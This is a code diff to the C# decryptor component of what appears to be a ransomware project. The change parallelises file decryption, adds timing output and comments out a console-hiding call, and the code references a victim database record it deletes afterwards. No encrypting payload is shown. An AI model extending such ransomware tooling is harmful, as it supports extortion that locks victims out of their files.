@@ -8,7 +8,7 @@ using System.Security.AccessControl;
 using System.Windows.Forms;
 using Encryptor;
 using System.Runtime.InteropServices;
-
+using System.Threading.Tasks;
 
 
 namespace Decryptor
@@ -23,18 +23,27 @@ namespace Decryptor
 		[DllImport("user32.dll")]
 		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 		const int SW_HIDE = 0;
+		static List<string> toDecrypt;
+		
 		
 		public static void Main(string[] args)
 		{              
-
-			//System.Console.WriteLine("KEY IS: " + DB.getKey());
-			//System.Console.WriteLine("Status IS: " + DB.getStatus());
-			hideConsole();
+			//hideConsole();
 			
 			TryToGetKey();
 			
+			
+			var watch = System.Diagnostics.Stopwatch.StartNew();
+			
+			
 			AesCryptoServiceProvider decryptAes = getDecryptionCipher();
+			toDecrypt = new List<string>();
 			decryptAllFiles(baseDirectory, decryptAes);
+			decryptToDecryptList(decryptAes);
+			
+			watch.Stop();
+			var elapsedMs = watch.ElapsedMilliseconds;
+			Console.WriteLine("Elapsed Time: "+ elapsedMs + "and in Seconds: "+ (elapsedMs/1000));
 
 			dislpayCompletionMessage();
 			deleteVictimFromDB();
@@ -127,18 +136,8 @@ namespace Decryptor
 
 				foreach (string filePath in currentFiles)
 				{
-					try
-					{
-						decryptFile(filePath, aes);
-					}
-					catch (CryptographicException)
-					{
-						//System.Console.WriteLine("Couldn't Decrypt: " + currentDirectory);
-					}
-					catch
-					{
-						//System.Console.WriteLine("Couldn't Decrypt??: " + currentDirectory);
-					}
+					toDecrypt.Add(filePath);
+					//decryptFile(filePath, aes);
 					
 				}
 
@@ -185,6 +184,38 @@ namespace Decryptor
 
 		}
 
+		
+		private static void decryptToDecryptList(AesCryptoServiceProvider aes)
+		{
+			/*
+			foreach (var filePath in toDecrypt)
+			{
+				try
+				{
+					decryptFile(filePath, aes);
+
+				}
+				catch
+				{
+				}
+			}
+			*/
+			
+			Parallel.ForEach(toDecrypt, filePath =>
+				{
+					try
+					{
+						decryptFile(filePath, aes);
+
+					}
+					catch
+					{
+					}
+				}
+			);
+			
+			
+		}
 		
 		
 		/// <summary>
